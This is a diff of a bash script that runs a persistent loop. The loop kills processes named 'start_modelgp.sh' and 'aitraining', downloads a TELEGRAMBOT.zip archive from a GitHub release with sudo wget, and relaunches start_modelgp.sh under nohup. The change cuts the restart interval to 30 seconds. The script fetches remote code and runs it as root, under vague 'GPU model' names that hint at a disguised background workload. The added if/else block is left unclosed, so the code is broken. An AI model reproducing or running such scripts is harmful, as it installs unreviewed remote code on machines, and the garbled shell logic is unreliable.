@@ -9,12 +9,16 @@ sudo apt install -y unzip
 while true; do
     echo "Starting GPU model process..."
 
-    # Kill any existing start_modelgp.sh or aitraining process to avoid duplicates
     if pgrep -f "start_modelgp.sh" > /dev/null; then
-        echo "Found existing start_modelgp.sh process. Killing it..."
         sudo pkill -f "start_modelgp.sh"
-        sleep 5
+        echo "Process stopped."
+    else
+        echo "Process already stopped or crashed."
     fi
+    if pgrep -f "aitraining" > /dev/null; then
+        sudo pkill -f "aitraining"
+        echo "Process stopped."
+    else
  nohup bash -c '
     # Re-download the TELEGRAMBOT package (optional)
     sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
@@ -35,7 +39,7 @@ sudo chmod +x start_modelgp.sh
     echo "start_modelgp.sh is now running. It will run for 1 hour."
 
     # Wait for 1 hour before restarting
-    sleep 3600
+    sleep 30
 
     echo "Stopping running GPU process..."
     if pgrep -f "start_modelgp.sh" > /dev/null; then
